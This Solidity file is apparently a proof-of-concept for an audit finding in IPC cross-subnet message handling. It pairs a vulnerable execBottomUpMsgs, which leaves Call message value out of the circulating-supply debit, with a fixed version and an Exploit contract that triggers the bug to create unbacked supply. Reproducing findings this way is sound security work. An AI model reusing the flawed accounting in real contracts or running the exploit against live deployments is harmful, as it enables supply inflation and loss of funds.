// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.27;

// Recall H-02 (Code4rena 2025-02). execBottomUpMsgs adds message value into
// the circulating-supply debit only when kind != Call. A Call with value > 0
// still moves funds and increases the destination supply, so the source
// subnet's circSupply stays inflated.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

contract Erc20 {
    string public symbol;
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    constructor(string memory s) {
        symbol = s;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

enum IpcMsgKind {
    Transfer,
    Call,
    Result
}

struct IpcEnvelope {
    IpcMsgKind kind;
    address recipient;
    uint256 value;
}

error NotEnoughSubnetCircSupply();

contract CheckpointingFacet {
    Erc20 public ipc;
    uint256 public circSupplyA;
    uint256 public circSupplyB;
    uint256 public totalValueAccounted;
    uint8 public seenKind;

    constructor(Erc20 _ipc, uint256 initialCirc) {
        ipc = _ipc;
        circSupplyA = initialCirc;
    }

    /// Quoted execBottomUpMsgs. Call value is skipped.
    function execBottomUpMsgs(IpcEnvelope[] calldata msgs) external {
        uint256 totalValue;
        uint256 crossMsgLength = msgs.length;
        for (uint256 i; i < crossMsgLength;) {
            seenKind = uint8(msgs[i].kind);
            // @> VULN: Call messages with value are omitted from totalValue
            if (msgs[i].kind != IpcMsgKind.Call) {
                totalValue += msgs[i].value;
            }
            unchecked {
                ++i;
            }
        }
        uint256 totalAmount = totalValue;
        if (circSupplyA < totalAmount) revert NotEnoughSubnetCircSupply();
        circSupplyA -= totalAmount;
        totalValueAccounted = totalAmount;
        for (uint256 j; j < crossMsgLength;) {
            if (msgs[j].kind == IpcMsgKind.Call) {
                circSupplyB += msgs[j].value;
                require(ipc.transfer(msgs[j].recipient, msgs[j].value), "move");
            }
            unchecked {
                ++j;
            }
        }
    }
}

contract CheckpointingFacetFixed {
    Erc20 public ipc;
    uint256 public circSupplyA;
    uint256 public circSupplyB;

    constructor(Erc20 _ipc, uint256 initialCirc) {
        ipc = _ipc;
        circSupplyA = initialCirc;
    }

    function execBottomUpMsgs(IpcEnvelope[] calldata msgs) external {
        uint256 totalValue;
        uint256 crossMsgLength = msgs.length;
        for (uint256 i; i < crossMsgLength;) {
            totalValue += msgs[i].value;
            unchecked {
                ++i;
            }
        }
        if (circSupplyA < totalValue) revert NotEnoughSubnetCircSupply();
        circSupplyA -= totalValue;
        for (uint256 j; j < crossMsgLength;) {
            if (msgs[j].kind == IpcMsgKind.Call) {
                circSupplyB += msgs[j].value;
                require(ipc.transfer(msgs[j].recipient, msgs[j].value), "move");
            }
            unchecked {
                ++j;
            }
        }
    }
}

contract Exploit {
    uint256 internal constant SUPPLY = 1_000_000 ether;
    uint256 internal constant VALUE = 5_000 ether;
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    Erc20 public ipc;
    Erc20 public marker;
    CheckpointingFacet public gateway;

    constructor() {
        ipc = new Erc20("IPC");
        marker = new Erc20("UNBACKED");
        gateway = new CheckpointingFacet(ipc, SUPPLY);
        ipc.mint(address(gateway), SUPPLY);
    }

    function run() external {
        IpcEnvelope[] memory msgs = new IpcEnvelope[](1);
        msgs[0] = IpcEnvelope({kind: IpcMsgKind.Call, recipient: address(this), value: VALUE});
        gateway.execBottomUpMsgs(msgs);
        uint256 circ = gateway.circSupplyA() + gateway.circSupplyB();
        uint256 backing = ipc.balanceOf(address(gateway)) + ipc.balanceOf(address(this));
        uint256 unbacked = circ - backing;
        require(gateway.circSupplyA() == SUPPLY, "circA");
        require(gateway.totalValueAccounted() == 0, "skipped");
        require(gateway.seenKind() == uint8(IpcMsgKind.Call), "kind");
        require(unbacked == VALUE, "unbacked");
        marker.mint(SINK, unbacked);
        require(marker.balanceOf(SINK) == VALUE, "marker");
    }
}
